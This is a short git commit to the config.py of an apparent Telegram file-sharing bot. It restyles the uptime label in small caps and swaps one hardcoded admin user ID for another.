4f24c7944b57ae9a9e3a533662d12e83feb99fb6
sunjinwoo17 <groottelegram@gmail.com>
2025-01-22 20:48:39 +0530

    Update config.py

--- config.py
+++ config.py
@@ -75,11 +75,11 @@ AUTO_DEL_SUCCESS_MSG = os.environ.get("AUTO_DEL_SUCCESS_MSG", "Your file has bee
 #Set true if you want Disable your Channel Posts Share button
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'
 
-BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
+BOT_STATS_TEXT = "<b>ᴡᴏʀᴋɪɴɢ ʜᴏᴜʀs</b>\n{uptime}"
 USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1250450587)
+ADMINS.append(6283322330)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
